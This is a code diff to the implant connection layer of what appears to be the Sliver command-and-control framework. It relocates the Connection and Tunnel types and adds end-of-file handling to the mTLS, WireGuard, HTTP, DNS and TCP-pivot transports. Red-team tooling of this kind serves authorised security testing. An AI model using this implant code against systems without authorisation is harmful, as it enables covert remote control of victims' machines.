@@ -61,12 +61,15 @@ import (
 
 	// {{end}}
 
+	// {{if not .Config.NamePipec2Enabled}}
 	"io"
 	"net/url"
 	"sync"
-	"time"
 
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	// {{end}}
+
+	"time"
 )
 
 var (
@@ -75,127 +78,6 @@ var (
 
 type Start func() error
 type Stop func() error
-
-// Connection - Abstract connection to the server
-type Connection struct {
-	Send    chan *pb.Envelope
-	Recv    chan *pb.Envelope
-	IsOpen  bool
-	ctrl    chan struct{}
-	cleanup func()
-	once    *sync.Once
-	tunnels *map[uint64]*Tunnel
-	mutex   *sync.RWMutex
-
-	uri      *url.URL
-	proxyURL *url.URL
-
-	Start Start
-	Stop  Stop
-}
-
-// URL - Get the c2 URL of the connection
-func (c *Connection) URL() string {
-	if c.uri == nil {
-		return ""
-	}
-	return c.uri.String()
-}
-
-// ProxyURL - Get the c2 URL of the connection
-func (c *Connection) ProxyURL() string {
-	if c.proxyURL == nil {
-		return ""
-	}
-	return c.proxyURL.String()
-}
-
-// Cleanup - Execute cleanup once
-func (c *Connection) Cleanup() {
-	c.once.Do(func() {
-		c.cleanup()
-		c.IsOpen = false
-	})
-}
-
-// Tunnel - Duplex byte read/write
-type Tunnel struct {
-	ID uint64
-
-	Reader       io.ReadCloser
-	readSequence uint64
-
-	Writer        io.WriteCloser
-	writeSequence uint64
-
-	mutex *sync.RWMutex
-}
-
-func NewTunnel(id uint64, reader io.ReadCloser, writer io.WriteCloser) *Tunnel {
-	return &Tunnel{
-		ID:     id,
-		Reader: reader,
-		Writer: writer,
-		mutex:  &sync.RWMutex{},
-	}
-}
-
-func (c *Tunnel) ReadSequence() uint64 {
-	c.mutex.RLock()
-	defer c.mutex.RUnlock()
-
-	return c.readSequence
-}
-
-func (c *Tunnel) WriteSequence() uint64 {
-	c.mutex.RLock()
-	defer c.mutex.RUnlock()
-
-	return c.writeSequence
-}
-
-func (c *Tunnel) IncReadSequence() {
-	c.mutex.Lock()
-	defer c.mutex.Unlock()
-
-	c.readSequence += 1
-}
-
-func (c *Tunnel) IncWriteSequence() {
-	c.mutex.Lock()
-	defer c.mutex.Unlock()
-
-	c.writeSequence += 1
-}
-
-// Tunnel - Add tunnel to mapping
-func (c *Connection) Tunnel(ID uint64) *Tunnel {
-	c.mutex.RLock()
-	defer c.mutex.RUnlock()
-	return (*c.tunnels)[ID]
-}
-
-// AddTunnel - Add tunnel to mapping
-func (c *Connection) AddTunnel(tun *Tunnel) {
-	c.mutex.Lock()
-	defer c.mutex.Unlock()
-
-	(*c.tunnels)[tun.ID] = tun
-}
-
-// RemoveTunnel - Add tunnel to mapping
-func (c *Connection) RemoveTunnel(ID uint64) {
-	c.mutex.Lock()
-	defer c.mutex.Unlock()
-	delete(*c.tunnels, ID)
-}
-
-func (c *Connection) RequestResend(data []byte) {
-	c.Send <- &pb.Envelope{
-		Type: pb.MsgTunnelData,
-		Data: data,
-	}
-}
 
 // StartConnectionLoop - Starts the main connection loop
 func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection {
@@ -333,7 +215,6 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[mtls] lost connection, cleanup...")
 			// {{end}}
-			close(send)
 			conn.Close()
 			close(recv)
 		},
@@ -393,7 +274,10 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 			for {
 				envelope, err := mtls.ReadEnvelope(conn)
 				if err == io.EOF {
-					break
+					// {{if .Config.Debug}}
+					log.Printf("[mtls] eof")
+					// {{end}}
+					return
 				}
 				if err != io.EOF && err != nil {
 					break
@@ -434,7 +318,6 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[wg] lost connection, cleanup...")
 			// {{end}}
-			close(send)
 			conn.Close()
 			dev.Down()
 			close(recv)
@@ -503,7 +386,10 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 			for {
 				envelope, err := wireguard.ReadEnvelope(conn)
 				if err == io.EOF {
-					break
+					// {{if .Config.Debug}}
+					log.Printf("[wireguard] eof")
+					// {{end}}
+					return
 				}
 				if err != io.EOF && err != nil {
 					break
@@ -540,7 +426,6 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[http] lost connection, cleanup...")
 			// {{end}}
-			close(send)
 			ctrl <- struct{}{}
 			close(recv)
 		},
@@ -588,6 +473,12 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 					return
 				default:
 					envelope, err := client.ReadEnvelope()
+					if err == io.EOF {
+						// {{if .Config.Debug}}
+						log.Printf("[http] eof")
+						// {{end}}
+						return
+					}
 					switch errType := err.(type) {
 					case nil:
 						errCount = 0
@@ -655,7 +546,6 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 			// {{if .Config.Debug}}
 			log.Printf("[dns] lost connection, cleanup...")
 			// {{end}}
-			close(send)
 			ctrl <- struct{}{} // Stop polling
 			close(recv)
 		},
@@ -719,6 +609,11 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 						log.Printf("[dns] session is closed")
 						// {{end}}
 						return
+					case io.EOF:
+						// {{if .Config.Debug}}
+						log.Printf("[dns] eof")
+						// {{end}}
+						return
 					default:
 						errCount++
 						// {{if .Config.Debug}}
@@ -761,7 +656,6 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			log.Printf("[tcp pivot] lost connection, cleanup...")
 			// {{end}}
 			pingCtrl <- struct{}{}
-			close(send)
 			ctrl <- struct{}{}
 			close(recv)
 		},
@@ -835,7 +729,10 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			for {
 				envelope, err := pivot.ReadEnvelope()
 				if err == io.EOF {
-					break
+					// {{if .Config.Debug}}
+					log.Printf("[tcp pivot] eof")
+					// {{end}}
+					return
 				}
 				if err != nil {
 					// {{if .Config.Debug}}
